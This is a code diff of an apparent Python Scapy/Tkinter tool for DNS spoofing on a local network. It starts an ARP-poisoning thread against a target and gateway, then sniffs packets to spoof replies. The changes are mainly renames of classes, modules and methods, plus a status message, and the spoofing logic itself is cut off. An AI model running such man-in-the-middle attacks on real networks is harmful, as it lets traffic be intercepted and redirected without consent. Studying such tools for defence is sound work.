@@ -1,11 +1,11 @@
 from scapy.all import *
-from dnsarp import dnsarp
+from arpPoisonForDnsSsl import arpPoisonForDnsSsl
 import threading
 from Tkinter import*
 import sys
 import os
 
-class dnsfinal():
+class dnsSpoofing():
     
     def __init__(self, interface, root):
         self.interface = interface
@@ -127,18 +127,18 @@ class dnsfinal():
         self.re.pack(side=BOTTOM)
         self.printResult(scroll)
         while True:
-            sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)
+            sniff(store=0, prn=lambda packet: self.Spoof(packet), iface=self.interface)
 
     def printResult(self, scroll):
         self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
         scroll.config(command=self.show.yview)
         self.show.pack()
-        self.show.insert(END, "DNS sniffing has started" + '\n')
+        self.show.insert(END, "Start DNS spoofing" + '\n')
         self.show.see(END)
         self.show.update_idletasks()
 
     def startThread(self):
-        arpprocess = dnsarp(self.interface)
+        arpprocess = arpPoisonForDnsSsl(self.interface)
         arpprocess.setInput(self.rangeIPs, self.usedIPs, self.defaultGateway, self.target, self.myMAC, "y", "loud")
         proc_thread = None
         proc_thread = threading.Thread(target=arpprocess.startProcess)
@@ -146,7 +146,7 @@ class dnsfinal():
         proc_thread.start()
 
     #method which does the DNS spoofing of a packet
-    def doSpoofing(self, packet):
+    def Spoof(self, packet):
         self.root.update()
         if packet.haslayer(Ether) and packet.haslayer(IP):#checks whether it is a correct packet
             try:
